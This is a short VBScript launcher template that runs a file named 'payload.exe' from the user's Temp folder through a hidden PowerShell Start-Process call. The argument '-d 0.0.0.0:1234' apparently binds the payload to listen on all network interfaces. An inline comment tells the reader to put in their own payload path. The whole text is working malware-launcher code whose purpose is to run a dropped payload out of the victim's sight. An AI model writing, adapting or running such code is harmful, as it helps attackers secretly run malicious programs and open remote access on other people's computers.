Set objShell = CreateObject("WScript.Shell")
strTempFolder = objShell.ExpandEnvironmentStrings("%Temp%")
'your payload file path . 
strExePath = strTempFolder & "\payload.exe"
strCommand = "powershell.exe -Command ""& {Start-Process '" & strExePath & "' -ArgumentList '-d 0.0.0.0:1234'}"""

objShell.Run strCommand, 0, True
